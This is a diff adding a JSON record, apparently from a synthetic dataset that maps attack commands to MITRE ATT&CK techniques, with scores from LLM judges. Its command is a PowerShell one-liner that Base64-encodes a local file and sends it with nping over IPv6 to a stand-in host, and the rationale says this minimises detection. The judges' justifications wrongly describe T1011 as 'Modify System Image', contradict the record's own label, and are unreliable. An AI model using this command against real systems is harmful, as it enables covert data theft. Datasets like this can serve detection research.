@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --tcp --flags psh,ack --dest-port 59055 --data-string $b -c 1 2001:db8:dead:beef::25",
+  "explanation": "Uses nping to inject a TCP payload over IPv6 with PSH/ACK to a non-standard port, providing a separate path from typical web exfiltration and matching T1011's use of alternative network mediums.",
+  "rationale_steps": [
+    "Prepare Base64 data for transfer as TCP payload.",
+    "Send a single IPv6 TCP packet with payload to an uncommon high port to minimize detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-5747d5e0",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid variable assignment, proper method calls, and correct nping parameter formatting.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network channel, it doesn't align with T1011 (Exfiltration Over Other Network Medium) as it's using standard TCP/IPv6 rather than modifying system images/firmware as described in the technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:25:06.058827Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell syntax for variable assignment and method calls, and valid nping flags and arguments.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration over an alternative protocol, which is unrelated to the T1011 'Modify System Image' technique; it does not alter any system or firmware image.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:25:15.579535Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell variable assignment and subsequent nping invocation are well-formed with balanced quoting and valid-looking flags/parameters.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates file data over IPv6 using nping and does not modify any OS/firmware image or boot process, which is unrelated to the described Modify System Image technique.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:25:29.314579Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
